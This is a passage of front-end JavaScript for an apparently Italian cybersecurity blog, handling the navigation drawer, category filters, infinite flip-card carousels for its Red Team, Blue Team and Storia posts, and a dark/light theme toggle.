  burger?.addEventListener('click', () => burger.classList.contains('open') ? closeNav() : openNav());
  overlay?.addEventListener('click', closeNav);

  // Nav drawer category links
  drawer?.querySelectorAll('[data-cat]').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      const cat = a.dataset.cat;
      closeNav();
      if (cat === 'fond') { window.location.href = 'fondamentali.html'; return; }
      window.location.href = 'index.html';
      sessionStorage.setItem('filterCat', cat);
    });
  });
}

function initFilterSheet() {
  const btn     = document.getElementById('filterDrawerBtn');
  const sheet   = document.getElementById('filterSheet');
  const overlay = document.getElementById('filterOverlay');
  const close   = document.getElementById('filterSheetClose');

  function openSheet() {
    sheet?.classList.add('open');
    overlay?.classList.add('active');
    btn?.setAttribute('aria-expanded','true');
    document.body.style.overflow = 'hidden';
  }
  function closeSheet() {
    sheet?.classList.remove('open');
    overlay?.classList.remove('active');
    btn?.setAttribute('aria-expanded','false');
    document.body.style.overflow = '';
  }

  btn?.addEventListener('click', openSheet);
  overlay?.addEventListener('click', closeSheet);
  close?.addEventListener('click', closeSheet);

  // Cat buttons in sheet
  document.querySelectorAll('#filterSheetCats [data-cat]').forEach(b => {
    b.addEventListener('click', () => {
      setCategory(b.dataset.cat);
      closeSheet();
    });
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ CATEGORY CLICK HANDLERS
   ────────────────────────────────────────────────────────── */
function initCatHandlers() {
  const scrollToArticles = () =>
    document.getElementById('articles')?.scrollIntoView({ behavior: 'smooth', block: 'start' });

  // Sidebar (no animation, direct filter)
  document.querySelectorAll('#sidebarCats [data-cat]').forEach(btn => {
    btn.addEventListener('click', () => setCategory(btn.dataset.cat));
  });

  // Category cards — hero expand transition
  document.querySelectorAll('.cat-card[data-cat]').forEach(card => {
    const trigger = () => {
      const cat = card.dataset.cat;
      if (cat === 'fond') { window.location.href = 'fondamentali.html'; return; }
      heroTransition(card, cat, () => { setCategory(cat); scrollToArticles(); });
    };
    card.addEventListener('click', trigger);
    card.addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); trigger(); }
    });
  });

  // Stat boxes — hero expand transition
  document.querySelectorAll('.stat-box[data-cat]').forEach(box => {
    const trigger = () => {
      const cat = box.dataset.cat;
      if (cat === 'fond') { window.location.href = 'fondamentali.html'; return; }
      heroTransition(box, cat, () => { setCategory(cat); scrollToArticles(); });
    };
    box.addEventListener('click', trigger);
    box.addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); trigger(); }
    });
  });

  // Nav links
  document.querySelectorAll('.nav-links [data-cat], .f-nav [data-cat]').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      setCategory(a.dataset.cat);
    });
  });

  // Reset
  document.getElementById('resetFilter')?.addEventListener('click', () => {
    activeCat = ''; activeTag = '';
    syncCatUI(); syncTagUI(); render();
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ INFINITE CAROUSELS (Red Team, Blue Team, Storia)
   ────────────────────────────────────────────────────────── */
const CAR_CATS = [
  { key: 'red',    label: 'Red Team',  dur: 38 },
  { key: 'blue',   label: 'Blue Team', dur: 44 },
  { key: 'storia', label: 'Storia',    dur: 41 },
];

function buildFlipCard(post, staggerIdx, isFirst) {
  const tags   = (post.tags || []).slice(0, 4);
  const delay  = isFirst ? `style="animation-delay:${staggerIdx * 0.1}s"` : '';
  const hidden = isFirst ? 'style="opacity:0"' : '';
  return `
    <a class="inf-flip" href="posts/${post.id}.html" data-cat="${post.cat}"
       aria-label="${post.title}" ${isFirst ? `data-stagger="${staggerIdx}"` : ''}>
      <div class="inf-flip-inner">
        <div class="inf-flip-front">
          <span class="inf-front-badge">${CAT_LABEL[post.cat] || post.cat}</span>
          <div class="inf-front-title">${post.title}</div>
          <time class="inf-front-date" datetime="${post.date}">${fmtDate(post.date)}</time>
        </div>
        <div class="inf-flip-back">
          <div class="inf-back-cat">${(CAT_LABEL[post.cat] || post.cat).toUpperCase()}</div>
          <div class="inf-back-tags">${tags.map(t => `<span class="inf-back-tag">${t}</span>`).join('')}</div>
          <div class="inf-back-cta"><span class="inf-back-link">Leggi articolo →</span></div>
        </div>
      </div>
    </a>`;
}

function initInfCarousels() {
  const wrap = document.getElementById('infCarsWrap');
  if (!wrap) return;

  CAR_CATS.forEach(({ key, label, dur }) => {
    const posts = POSTS.filter(p => p.cat === key);
    if (!posts.length) return;

    /* build HTML — duplicate cards for seamless infinite loop */
    const firstSet  = posts.map((p, i) => buildFlipCard(p, i, true)).join('');
    const secondSet = posts.map(p      => buildFlipCard(p, 0, false)).join('');

    const section = document.createElement('div');
    section.className = 'inf-car';
    section.dataset.cat = key;
    section.innerHTML = `
      <div class="inf-car-hdr">
        <span class="inf-car-label">${label}</span>
        <div class="inf-car-line"></div>
        <span class="inf-car-count">${posts.length} articoli</span>
      </div>
      <div class="inf-car-viewport">
        <div class="inf-car-track" style="--car-dur:${dur}s">
          ${firstSet}${secondSet}
        </div>
      </div>`;
    wrap.appendChild(section);

    /* click handler → hero page transition */
    section.querySelectorAll('.inf-flip').forEach(card => {
      card.addEventListener('click', e => {
        e.preventDefault();
        const href = card.getAttribute('href');
        if (!href) return;
        heroPageTransition(card, key, href);
      });
    });
  });

  /* IntersectionObserver: entry stagger animation + start scrolling */
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const track      = entry.target.querySelector('.inf-car-track');
      const firstCards = [...track.querySelectorAll('.inf-flip[data-stagger]')];
      const lastIdx    = firstCards.length - 1;

      /* stagger each first-set card */
      firstCards.forEach((card, i) => {
        card.style.animationDelay = `${i * 0.1}s`;
        card.classList.add('card-enter');
        card.addEventListener('animationend', () => {
          card.style.opacity = '';
          card.style.animationDelay = '';
          card.classList.remove('card-enter');
          card.removeAttribute('data-stagger');
        }, { once: true });
      });

      /* start infinite scroll after last card has entered */
      const startScrollMs = lastIdx * 100 + 780;
      setTimeout(() => track.classList.add('scroll-run'), startScrollMs);

      observer.unobserve(entry.target);
    });
  }, { threshold: 0.15 });

  document.querySelectorAll('.inf-car').forEach(car => observer.observe(car));
}

/* ──────────────────────────────────────────────────────────
   ▶ THEME TOGGLE
   ────────────────────────────────────────────────────────── */
function initTheme() {
  const btn = document.getElementById('themeToggle');
  if (!btn) return;

  function applyTheme(t) {
    document.documentElement.setAttribute('data-theme', t);
    localStorage.setItem('theme', t);
    btn.textContent = t==='dark' ? '◐ LIGHT' : '◑ DARK';
  }

  const saved = localStorage.getItem('theme') || 'dark';
  applyTheme(saved);

  btn.addEventListener('click', () => {
    const cur = document.documentElement.getAttribute('data-theme');
    applyTheme(cur==='dark' ? 'light' : 'dark');
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ RESTORE SESSION FILTER (from nav drawer nav)
   ────────────────────────────────────────────────────────── */
function restoreFilter() {
  const cat = sessionStorage.getItem('filterCat');
  if (cat) {
    sessionStorage.removeItem('filterCat');
    activeCat = cat;
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ INIT
   ────────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  initSmoothScroll();
  initHeroReveal();
  initCanvas();
  initTheme();
  restoreFilter();
  updateCounts();
  buildTagsUI();
  syncCatUI();
  render();
  initSearch();
  initSearchToggle();
  initNav();
  initFilterSheet();
  initCatHandlers();
  init3DTilt();
  initInfCarousels();
  initTagPanel();
});
